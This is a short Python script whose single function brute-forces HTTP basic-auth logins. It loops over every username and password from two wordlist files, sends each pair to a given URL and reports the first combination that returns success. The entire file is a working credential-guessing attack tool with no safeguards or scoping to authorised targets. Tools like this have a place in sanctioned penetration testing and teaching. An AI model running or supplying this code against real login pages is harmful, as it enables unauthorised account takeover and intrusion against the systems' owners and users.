import requests

def brute_force_login(url, username_file="wordlists/usernames.txt", password_file="wordlists/passwords.txt"):
    print(f"\n🚨 Starting brute-force on {url}")

    with open(username_file, 'r') as uf, open(password_file, 'r') as pf:
        usernames = [u.strip() for u in uf]
        passwords = [p.strip() for p in pf]

    for username in usernames:
        for password in passwords:
            print(f"Trying {username}:{password}")
            response = requests.get(url, auth=(username, password))
            if response.status_code == 200:
                print(f"✅ SUCCESS: {username}:{password}")
                return
    print("❌ Brute-force failed.")
